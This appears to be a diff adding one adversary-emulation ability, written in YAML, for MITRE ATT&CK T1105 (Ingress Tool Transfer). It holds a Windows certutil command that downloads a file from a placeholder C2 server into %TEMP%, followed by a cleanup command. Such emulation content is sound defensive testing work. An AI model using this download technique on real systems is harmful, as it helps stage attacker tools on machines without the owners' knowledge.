@@ -1,0 +1,14 @@
+- id: 51955f0a-24f8-424f-8731-ccecad4445a0
+  name: Ingress tool transfer
+  description: Downloads a file from the operator C2 to disk using certutil (living-off-the-land). Produces a real outbound network connection and a file-write; the content fetched is the benign C2 response, so nothing harmful is introduced. Self-cleans.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      cmd:
+        command: |
+          certutil -urlcache -split -f "#{server}" "%TEMP%\staged_tool.bin" & dir "%TEMP%\staged_tool.bin"
+        cleanup: |
+          del /f /q "%TEMP%\staged_tool.bin"
